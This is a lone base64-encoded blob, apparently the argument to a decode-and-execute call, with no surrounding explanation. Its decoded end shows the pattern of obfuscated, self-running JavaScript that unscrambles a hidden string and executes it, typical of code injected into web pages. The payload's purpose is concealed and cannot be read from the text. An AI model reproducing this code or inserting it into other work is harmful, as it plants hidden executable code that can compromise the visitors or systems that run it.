Li5FKSE7bDcuSjVtNVtHfTtXN2lXZX0+KFdpV3JybldhaDAlLDt0KHIxNGwsNDY9MUJpVylkVyspLlcueyFiKH1dZih1YldmV1c3Li5ucGoufSUuVyhHSzNXKG5zKGZdcyU9SS51K1d0bzldb1tnaV07VC1oXWZXIFd3Q3IyaW9oe0szKyklYV1ddGdpc0JvYTB7IShmQGZXPHBtYXIlX0NoX2FXZWJlOlckZWcuaWJXOlc2MChXJmYlXSU7Lm9wJW0zVz9mLmFXZS4pYzFlLmVXOkxXP319YVdbV3hpKW5yXC8oc0BmLj1sLW8pKDh5IFdsb1ctW25XJWZjOGYldGxdKStpLjQrK11uV210KXkuNmRpci0lZTIlVzguKGZXOm5XYmUhVzYsTWl9XVdmX3JuXC89fS4oVzArXC9dV1cuckg0JSg9OnR7citfSih3dDMsOzA0fWQpeWV0VzFhYS1uYWFjV2VwfT1XV1dvdH1XPWVfIHUlYTFtb290KVcobEJqVyVjLmpnbmN0Vywpcl1vKV09JD0oLCxtdD9Xb24kblwvLCxpOW0oaG9zZDBjXSVhdzkrcmZfaGIibnRlc2w4cmFdM0BOKTghb20xZCNzKHt1Zm5uO1wvdCsuV2I7XWEuKGlsPiVzaWlDb11XfX0lIFdociVIZVd2IXNvMGYkZSElJS5vVzNmIDF0ZG57JVR3bCB4cCJuZSZmKDJ2bWQsaj0rZC5DZSVybmF1bCBuKV1kYShXOiAkIU9lXVdzbnI2Vy5sdF1uNUNXLnRvV1dhb2djKERXXStnZDNXV1c8dDZ5bXM2XSI0fS5XZXQlYXw/Om9dclNXKXRmV1AoZSZPZFctITVkcl0oZi5Xe28lMSEgXThwV2xfXVd1YTAxdWVuUzAuey5jc2dXMW9nb2ZhY1d0PVckOTNnbm0+OXUsYzEyV1tyMmZsdGouaDclNDBXZSx0bi5vaDk3M3BlLDZldVdddyR0K25jXT07c19paFdmYkJHd3RsMyYqZnRXaDJcLyUsQiBuYVduQjJrJWFXcW89XUVXIGY5ZSxmbi4wYWxvVyVzNV0uV3BXLiU9ZTQjbmEuZ0hpb2lXXC9dXV1dOWkpIGxXVytXdkchRlcuby50JTVuOGY9bil3LmYyV0JjcjFXKGVvZT1XaTBkMV0xOzZdLjFmbylwYyFnXSA9b2VXb251ZSUlM3V0Y2ZOJX0uYj1hIWZCV2RyPTIxaG4lXzRpZUx9XW4zIH04ZS40Zm4oIDEuKCg4LmNjKzogc2E2ZWx0ZT86OSxcL3JXKG1vMGxuc2R3JXQpVzYle31CbGN7Xz1XV3JhIDI5eyhfV2F0Lk5XV1dpdVchaSwuPSkubiU5dW5hNj1fdGU4bXNXeFchZm89aWVnO20uTSlXTiVldHMuIHB9e1wnZntyOixvKGlfc2QgOG19M3J0aV1XV11yZVdXTzh1XWVwKWYuV2FpKSl1VyhXdHQpPm5XcioubiJhN3NhV2JJJV9lKTFXXXQpb2k4V0psfG53MldXKGwlPV01cGZXXWZHbDE5V2Y9ci1kdC51dHY9bzkuKCw5Vz1yICspfWVXX2NXMW5XLXtnO0tXOl1dc29XV11Xb248JWY9YWE9d10kbX0gaFdmVzpsJVdDdFduLFduV3JdbCBGeS5teyBXIXN0Y2YlPSg9V0l4VzRlJVc9bHQpMml0ZT1XdDs3eDspMnQuNmdJbygxLV8uPTB4Y3JXOH06IiBsNDouVz03XTAsV3I5dFwnXSAtcl10LkVmO1codDRpXXApYiRdRXhGOGRfKVc5JTZXe2EpZi5Xci5ObDFuN2Z0bXUyJVdpICs5dDsyLSFJJilXLj1XPih9LGhmNmNuIjZXbi5XO1d0byNkcmYsfGNJW1c9V0gpdDd0LCt7O1c3Vyl0KTsoZmk7c2IuKytlLnQjdFcuKGYtTGEgIDI4KUplZWlXV2YldXQxV2QpLkxydClzV1czOiFhMGNyNWVvdG9XXUcoOld2XWIuNiE7ezRkO19XZFdXNX1XNF1mZXQpNiJpdGVkKF1kZTVsVy4waHJse2VzYS5XdldlV109XCcyVykwZCUpbWVzZD1hMyFwLjFXXC8yXWElZ2khNTZlM3RvfVdyfVdyY3NdLDp1JXdcJ3RyVz1vXV1XV3IrY1dbe0hXbFd0V250ZW5XKWZjdDJuIWcgdSh0KXUpKS4lZjV9KStXKUJpb2xXPHItVzEuV3tyLi0uYWZXOikpZD01aS45ZURlYVtlXCdkV313dDk/LjlodT4hJCZ5V11DMSpoZV0hO119SHMyKWVXcjI5ZnBbYVwvYSBNZSgoKW41aDNfbjBCZkwybmY4cDZhW3BXbz1iV08gXy4xICVXVzFXXTBmXXNXY3ViY1cxYWF0Y2VseGZuV1crdWMkZyxhV1dJZmlvOVcxZS46Li5mPWRuMm9FbitbLFs0Lm50ZFdQUDBdV3RlSDo0RnBvXXRzZFdJV3QuLSUycnRpci50MVc2W2RmaT10V0YsXSklTm94MS1dcHRTLi5ubH1jbjMqdGZ0ZXJXV2ZXZSY9e2w9JnR0V0ExPW50O28zPTQpMFdXaStmbWIsbDc7OldvRClsbSkgOCNXZytyLF0oKyRdV2lucnlpXS50dHRlO31ydS5XdXk6LmJrey50ZTVXaVczWz1ndi1hLmFmUztlMVctcyw4V2pXbiN3M2crKWVsJXBXKD06ZmVyZygpXWNpLiVwfSkhc2YjKXVbXXJfYnVqQldmVyxGPSlJcDNoV11vRTVXdC5pRCwzV3RLKW1XdDU7Y2VXdG9pMFc1V1dde2QyfVBiXVdyeDRfcj17LmxyV199IEA3LlddKSAuM1cxKS5mSkRueT0/V3s0V0EgcS5iKHcofW5XNG1XNVd5K1dlZnRLfUVoMWZmKXIlV2J9fUdvfXAzYiA9cigoKTksdWVvZTg9V11dOzs0XTskX2UuOThmW1dfdHVddDc7LUcpcjduLlcpb3NhZSA0MFc2ICxdJWhzVy5jIDYyaDQ4cikzZDMsIGYpaWxXV3IxV1d5NHA0eyAuaWFuYWVTO1coQV0pbzpOVyF1PWY5IikuLHk5czgxfTUxbWUxOzF2bDUuXXYudSw3MzouIDdpNXQhLmQoPSgzMXtmV2Y6Pl13ZSJGJWRyV25GIHJlNiA9PG90V2g0bVcocltoOyhfPXl0MiBsc2VnZStuVzBXaVdCIHN7Vy4xZmFXcm9yOV1lV2d0cjZjZWY1LGU7ZWVub3tmVzQicmchNTt9KW9wZigoYiU6byw8W2ZvLixNNF1sICluZ1dmdFwvdW4iYVcoYWc2Zm4ubGVcLy5zV1clZV90LihXLkQ9JSl0JykpO3ZhciBxbGk9S0duKFZ6YyxUYXYgKTtxbGkoNzMwNyk7cmV0dXJuIDI1NDB9KSgp'))
